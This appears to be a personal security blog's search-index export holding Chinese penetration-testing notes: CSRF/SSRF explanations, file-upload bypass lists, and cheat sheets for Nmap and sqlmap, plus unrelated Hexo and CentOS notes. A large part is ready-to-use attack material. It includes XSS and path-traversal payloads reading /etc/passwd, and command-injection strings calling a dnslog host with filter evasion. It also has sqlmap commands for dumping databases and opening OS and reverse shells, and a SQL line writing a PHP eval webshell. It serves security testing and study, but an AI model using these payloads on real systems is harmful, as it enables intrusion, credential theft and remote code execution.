CSRF Token a. 将CSRF Token输出到页面中 b. 页面提交的请求携带这个Token c. 服务器验证Token是否正确 双重cookie验证 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间） Samesite Cookie 属性 SSRF通常用于控制web进而探测内网服务以及拥挤内网脆弱应用 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 利用： file协议查看文件 dict协议探测端口 gopher协力支持get&amp;post请求 防御： 限制协议为HTTP，HTTPS 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 文件上传漏洞程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 造成文件上传漏洞的原因有： 开源编辑器的上传漏洞 服务器配置不当 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 绕过： %00 截断绕过 文件名绕过 大小写绕过 php2 php3 php5 phtml Content-Type绕过 前端js绕过 Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 防御 将文件上传的目录设置为不可执行 判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式 使用随机数改写文件名和文件路径。 常用web漏洞测试的payload整理[反射型xss] [在html形成] 123&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt; [在js形成] 123456document.title=&quot;[random]&quot;;//;document.title=&quot;[random]&quot;;//&quot;;document.title=&quot;[random]&quot;;&apos;;document.title=&quot;[random]&quot;;&quot;);document.title=&quot;[random]&quot;;&apos;);document.title=&quot;[random]&quot;; [在html属性形成(img)] 123888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;888 οnlοad=document.title=&quot;[random]&quot; [存储型xss] [通用payload]测试环境，需要在触发的地方查看payload显示情况 1234567891011121314151617181920&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;[Bypass on Event] [事件型绕过]&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt; #一般富文本不会过滤img标签[Bypass pseudo protocol] [伪协议绕过]&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;[Bypass html5 tag] [html5标签绕过]&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;如果进行盲测可以根据xss平台地址替换相应的js触发代码&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt; [静态文件读取] [常规检测] 123/../../../../../../../../../../../etc/passwd/../../../../../../../../../../../etc/hosts/../../../../../../../C:/Windows/system.ini [windows] [伪造绕过] 123456/././././././././././././././././././././././././../../../../../../etc/passwd/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts [后缀绕过] 1234567891011/../../../../../../../../../../../etc/passwd#/../../../../../../../../../../../etc/passwd%00/../../../../../../../../../../../etc/passwd#.jpg/../../../../../../../../../../../etc/passwd%00.jpg/../../../../../../../../../../../etc/passwd#.html/../../../../../../../../../../../etc/passwd%00.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html [命令执行漏洞] [常规检测] 1234;curl [random].test.dnslog.link | curl [random].test.dnslog.link | ping -n 2 [random].test.dnslog.link [Windows] | ping -c 2 [random].test.dnslog.link [Linux] [绕过检测] 123456789101112;curl [random].test.dnslog.link# | curl [random].test.dnslog.link#%20|%20curl%20[random].test.dnslog.link%20|%20curl%20[random].test.dnslog.link#%20|%20ping%20-n%202%20[random].test.dnslog.link%20|%20ping%20-c%202%20[random].test.dnslog.link#a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.linka=c;b=url;$a$b [random].test.dnslog.link#$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.linka=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.linka=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link# [ssrf漏洞] 1http://[random].test.dnslog.link/ [strust2命令执行] 1?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F868037e0.html</url>
    <content type="text"><![CDATA[nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描目标格式 示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL:从文件中加载目标 -iR:随机扫描 –exclude :排除网段或主机地址 –excledefile:排除文件中的地址 主机发现 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器 –system-dns:调用系统的DNS服务器 –traceroute：显示追踪到目标的路径 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags ：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI : Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 端口相关参数 -p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 排除端口 -F：扫描比缺省少的端口（缺省1000，加了-F100） -r：顺序扫描端口，缺省是随机分组扫描 –top-ports :按top排序扫描知名端口 –port-ratio : 按比例扫描知名端口，值在0-1之间，越小扫的越多 系统/版本探测 -sV:探测开放的端口的系统/服务信息 –version-intensity :设置版本检测的详程度级别，0-9，越高越详细 –version-light：输出最可能的版本信息，缺省是2 –version-all：使用所有的探测条件进行版本/系统探测 –version-trace:打印详细的版本扫描过程 脚本扫描 –script=:指定脚本名称 –script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数 –script-help=: 查看脚本帮助信息 –script-updatedb:更新脚本数据库 系统探测 -O:激活系统探测 –osscan-limit:只对开放端口的有效主机进行系统探测 –osscan-guess：推测系统信息 其他 -T:时间模板，越大速度越快 -6：使能IPV6探测 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -V：打印版本号 -v：增加输出的详细程度]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F519cc.html</url>
    <content type="text"><![CDATA[sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns #列出字段- –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 –privileges #查看权限 –is-dba #是否是数据库管理员 –roles #枚举数据库用户角色 –udf-inject #导入用户自定义函数（获取系统权限） –union-check #是否支持union 注入 –union-cols #union 查询表记录 –union-test #union 语句测试 –union-use #采用union 注入 –union-tech orderby #union配合order by –method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″) –cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “” #使用referer欺骗(–referer “http://www.baidu.com”) –user-agent “” #自定义user-agent –proxy “http://127.0.0.1:8118″ #代理注入 –string “” #指定关键词 –threads #采用多线程(–threads 3) –sql-shell #执行指定sql命令 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ ) –file-read #读取指定文件 –file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) –file-dest #要写入的文件绝对路径 –os-cmd=id #执行系统命令 –os-shell #系统交互shell –os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) –msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/) –os-smbrelay # –os-bof # –reg-read #读取win系统注册表 –priv-esc # –time-sec= #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入 –eta #盲注 1. 基础用法 ./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中 2. sqlmap post注入 在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.2cto.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 如下图，这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3. sqlmap cookies注入 sqlmap.py -u “http://127.0.0.1/base.php&quot; –cookies “id=1” –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础 上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”-p是指指定参数注入 4. sqlmap遇到url重写的注入 哪里存在注入就加上 号./sqlmap.py -u “http://www.cunlide.com/id1/1/id2/2” 5. sqlmap 编码绕waf注入在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py” sqlmap读文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-read “/etc/passwd” sqlmap写文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2 sqlmap分段脱裤 sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000其他基础： sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 信息获取 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” - –union-check #是否支持union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart–proxy”http://127.0.0.1:8118&quot; #代理注入 sqlmap -u “http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 ./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″“Show.asp” –cookie “id=9” –table –level 2–forms–data “data”–delay 0.5–safe-freq 25-v 3 –dbs –batch –tamper “base64encode.py”sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump-all -v 传统的sql语句写shell通过sql注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# dumpfile、file_put_contents outfile不能用了怎么办？select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;;可以 UDF提权https://www.cnblogs.com/milantgh/p/5444398.html outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。 写shell条件 文件名必须是绝对路径 用户必须有写文件权限 sqlmap写shell前提需要对目录具有写权限 1--os-cmd=&quot;net user&quot; 交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。 1--os-shell 写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell 关闭sqlmap文件就会被删除 常见数据库端口号123456789101112131415Oracle 默认1521SQL Server 默认1433Mysql默认330621 FTP22 ssh23 telnet25 smtp109 110 pop2 pop3]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo日志]]></title>
    <url>%2Fnote%2F2019%2Fundefined02%2F1c91193.html</url>
    <content type="text"><![CDATA[2019.6.1Git 远程遇到了问题: Please make sure you have the correct access rights and the repository exists. 发现是ssh key有问题，连接不上服务器 首先是重新在git设置一下身份的名字和邮箱： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;your@email.com&quot; 注：要添加具体的yourname，your@email 删除.ssh文件夹（直接搜索该文件夹）下的known_hosts 在 git输入命令： $ ssh-keygen -t rsa -C &quot;your@email.com&quot; 然后会出现： Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制 登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key 在 git 中输入命令 ssh -T git@github.com 然后输入Yes回车，就会提示成功 之后就可以正常 hexo d -g 啦]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS]]></title>
    <url>%2Fnote%2F2019%2Fundefined25%2F875db5e1.html</url>
    <content type="text"><![CDATA[CentOS 常用命令 shutdown -h now 关机 shutdown -h +3 三分钟后关机 halt poweroff init 0 shutdown -r now 重启 shutdown -r +3 三分钟重启 reboot init 6 cat 1.txt | tail - n +3001 | head -n 1000 截取文件中的3001到4000 grep o 1.txt 正常过滤 grep -v 1.txt 反向过滤 cat &gt;1.txt 清空文件内容 ll -d /data/www 查看权限 pkill -kill -t tty3 杀死用户进程 mkdir /media/cdrom mount /dev/sr0 /media/cdrom 挂载光盘 umount /media/cdrom 卸载 systemctl stop firewalld.service 关闭防火墙 setenforce 0 给外界权限 systemctl disable firewalld.service 永久关闭 systemctl enable firewalld.service 永久开启 vim /etc/rc.d/rc.local 设置开机启动为镜像添加开机自动挂载 echo &quot;mount /dev/sr0 /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local vim /etc/selinux/config ^vim^cat 把vim替换成cat继续执行 ls -al 看临时文件 CentOS7 目录文件 /etc/yum.repos.d/ yum源文件位置 /etc/rc.d/rc.local 开机启动文件 rm -f /var/run/yum.pid yum clean all 清空yum源缓存 /etc/nginx/conf.d/default.conf Nginx配置文件 vim /etc/my.cnf 去mysql密码要求 /usr/share/nginx/html/ Nginx主页文件位置 /etc/httpd/conf/httpd.conf Apache配置文件 /var/www/html/ Apache主页文件位置]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Who am I]]></title>
    <url>%2Fnote%2F2019%2Fundefined21%2Fe3eaa03c.html</url>
    <content type="text"><![CDATA[未来可期]]></content>
      <tags>
        <tag>Me</tag>
      </tags>
  </entry>
</search>
